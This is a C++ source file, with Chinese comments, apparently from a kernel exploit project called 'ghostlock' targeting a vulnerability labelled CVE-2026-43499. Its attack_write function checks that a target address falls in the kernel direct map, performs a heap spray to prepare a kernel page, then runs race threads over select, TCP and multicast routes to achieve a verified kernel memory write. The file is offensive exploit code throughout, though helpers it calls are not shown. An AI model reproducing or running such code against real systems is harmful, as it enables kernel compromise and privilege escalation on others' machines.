/**
 * @file backend.cpp
 * @brief 一次路由写（cmp_disasm 第 6 目标）：结构体入参，无全局/类读取。
 */
#include "backend.h"
#include "attack.h"
#include "route.h"
#include "session.h"
#include "support.h"
#include "log.h"
#include "memory.h"
#include "profile.h"

/* ==== session/backend/cve_2026_43499_backend.cpp (attack_write + instantiations) ==== */
namespace ghostlock::session::backend {
    namespace {
        /** @brief 与旧 `attack::timer_mark` 同格式，但起点由调用方给出。 */
        void timer_mark_from(std::uint64_t start_ns, const char *label) {
            const auto now = ghostlock::runtime_time::monotonic_now();
            const std::uint64_t now_ns = static_cast<std::uint64_t>(
                ghostlock::runtime_time::to_duration(now).count());
            const double elapsed_ms =
                static_cast<double>(now_ns - start_ns) / 1000000.0;
            pr_info("[T+%.0fms] %s\n", elapsed_ms, label);
            ghostlock::support::log_sync();
        }
    } // namespace

    template <class M>
    std::int32_t Cve2026_43499Policy::attack_write(core::WriteInputs &in) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", in.desc,
                in.request.target, static_cast<int32_t>(in.request.mode),
                !in.request.preserve_child);
        if (!(in.request.target > in.direct_map_base &&
              in.request.target < in.direct_map_end)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        timer_mark_from(in.timer_start_ns, "  heap spray start");
        (in.spray->current->base) = support::prepare_good_kernel_page(*in.spray);
        if (!(in.spray->current->base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        timer_mark_from(in.timer_start_ns, "  heap spray done");
        const bool routed = ghostlock::race::run_main_route_threads(*in.race).code ==
                            route::ROUTE_OK;

        timer_mark_from(in.timer_start_ns, "  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }
        return routed ? 1 : 0;
    }

    template std::int32_t Cve2026_43499Policy::attack_write<route::SelectPolicy>(
        core::WriteInputs &);
    template std::int32_t Cve2026_43499Policy::attack_write<route::TcpPolicy>(
        core::WriteInputs &);
    template std::int32_t Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
        core::WriteInputs &);

} // namespace ghostlock::session::backend
